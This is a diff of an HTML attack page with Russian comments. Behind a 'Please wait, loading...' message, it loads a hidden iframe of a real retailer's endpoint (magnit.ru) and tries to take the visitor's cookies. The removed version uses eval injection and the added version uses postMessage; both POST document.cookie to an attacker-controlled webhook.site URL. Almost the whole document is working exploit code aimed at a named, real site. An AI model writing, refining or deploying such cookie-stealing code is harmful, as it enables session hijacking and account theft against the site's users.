@@ -6,47 +6,39 @@
 <body>
     <p>Please wait, loading...</p>
     
-    <!-- Скрытый iframe для загрузки уязвимой страницы -->
     <iframe id="target" src="https://magnit.ru/webgate/v2/goods/get" style="width:1px;height:1px;border:none;"></iframe>
     
     <script>
-        // Ждем загрузки iframe
-        document.getElementById('target').onload = function() {
-            console.log('✅ iframe загружен (goods/get)');
-            
-            try {
-                // Получаем доступ к iframe
-                var iframeWindow = document.getElementById('target').contentWindow;
-                
-                // Если это тот же домен, можно выполнить код напрямую
-                // Внедряем скрипт, который отправит cookies на webhook
-                var script = `
-                    // Отправляем cookies на webhook
+        // Обработчик сообщений от iframe
+        window.addEventListener('message', function(event) {
+            if (event.origin === 'https://magnit.ru') {
+                console.log('✅ Получено сообщение от magnit.ru:', event.data);
+                // Отправляем cookies на webhook
+                if (event.data && event.data.cookies) {
                     fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
                         method: 'POST',
-                        headers: {'Content-Type': 'text/plain'},
-                        body: document.cookie
+                        body: event.data.cookies
                     });
-                `;
-                
-                // Выполняем скрипт в контексте iframe
-                iframeWindow.eval(script);
-                console.log('✅ Скрипт внедрен через eval');
-                
-            } catch(e) {
-                console.log('❌ Ошибка при внедрении через eval:', e.message);
-                
-                // Если eval не работает, пробуем через postMessage
-                try {
-                    var iframeWindow = document.getElementById('target').contentWindow;
-                    iframeWindow.postMessage({
-                        type: 'execute',
-                        code: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
-                    }, 'https://magnit.ru');
-                    console.log('✅ postMessage отправлен');
-                } catch(e2) {
-                    console.log('❌ Ошибка при postMessage:', e2.message);
                 }
+            }
+        });
+        
+        // Внедряем скрипт в iframe
+        document.getElementById('target').onload = function() {
+            console.log('✅ iframe загружен');
+            
+            try {
+                var iframeWindow = document.getElementById('target').contentWindow;
+                
+                // Отправляем сообщение в iframe
+                iframeWindow.postMessage({
+                    type: 'getCookies',
+                    payload: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
+                }, 'https://magnit.ru');
+                
+                console.log('✅ postMessage отправлен');
+            } catch(e) {
+                console.log('❌ Ошибка postMessage:', e.message);
             }
         };
     </script>
